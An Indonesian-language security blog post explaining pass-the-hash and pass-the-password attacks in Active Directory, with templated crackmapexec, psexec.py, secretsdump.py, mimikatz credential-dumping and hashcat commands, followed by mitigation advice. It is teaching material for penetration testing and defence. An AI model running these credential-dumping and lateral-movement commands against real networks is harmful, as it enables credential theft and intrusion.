---
title: Pass-Attack
date: 2022-03-06 11:50:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, pass-attack, mimikatz, impacket, crackmapexec]     # TAG names should always be lowercase
author:
  name: Nairpaa
  link: https://nairpaa.github.io
---

Pass-Attack dapat dilakukan ketika penyerang mendapatkan kredensial korban baik menggunakan user-password atau user-SAM hash. Serangan ini biasanya digunakan untuk melakukan *lateral movement*.

### Tujuan 

- *Lateral movement*

### Prasyarat

- Memiliki kredensial user domain


### Tools

- Mimikatz
- Impacket
- CrackMapExec (CME)

## Pass-the-Hash (PtH)

### Pass-The-Hash (PtH) via Remote

```bash
➜ crackmapexec <smb/winrm/etc> <ip-target/network> -u <user> -H <SAM-hash>
➜ psexec.py <domain>/<user>:<ip-target> -hashes <LMHASH:NTHASH> 
➜ secretsdump.py <domain>/<user>:<ip-target> -hashes <LMHASH:NTHASH> 
```

### Pass-The-Hash (PtH) via Mimikatz

![Cara kerja PtH](/assets/img/posts/pass-attack/1.png)

Prasayarat:
- Penyerang mendapatkan SAM hash user
- Penyerang menjadi lokal administrator 
- Ada bekas login user domain di komputer korban yang tersimpan di memori.

```bash
# Membuat log
mimikatz > log passthehash.log

# Mendapatkan hak debug (hak akses lokal admin diperlukan)
mimikatz > privilege::debug

# Dump kredensial yang ada di memori
mimikatz > sekurlsa::logonpasswords
```

![Mendapatkan NTLM hash menggunakan mimikatz](/assets/img/posts/pass-attack/2.png)
```bash
# PtH dengan mimikatz
mimikatz > sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM-hash>
```

![PtH dengan mimikatz](/assets/img/posts/pass-attack/3.png)
## Pass-the-Password (PtP)
```bash
➜ crackmapexec <smb/winrm/etc> <ip-target/network> -u <user> -p <password>
➜ psexec.py <domain>/<user>:<password>@<ip-target>
➜ secretsdump.py <domain>/<user>:<password>@<ip-target>
```

## Crack-the-Hash
```bash
➜ hashcat -m 1000 pass.hash /usr/share/wordlists/rockyou.txt 
```

## Mitigasi

Sulit untuk mencegah secara menyeluruh, tetapi kita dapat mempersulit penyerang:
- **Limit account re-use**:
	- Hindari menggunakan kata sandi yang sama untuk lokal admin.
	- Menonaktifkan user *guest* dan administrator.
	- Batasi siapa yang seharusnya jadi lokal administrator (*least privilege*).

- **Utilize strong passwords**:
	- Semakin panjang dan unik semakin baik (>14 karakter).
	- Hindari penggunaan kata yang umum.

- **Privilege Access Management (PAM)**
	- *Check out/in* di akun sensitif bila diperlukan.
	- Secara otomatis merubah kata sandi ketika *check out* dan *check in*.

---

## Referensi

- https://www.youtube.com/watch?v=bTYR_xYSDIk
- https://adsecurity.org/?page_id=1821




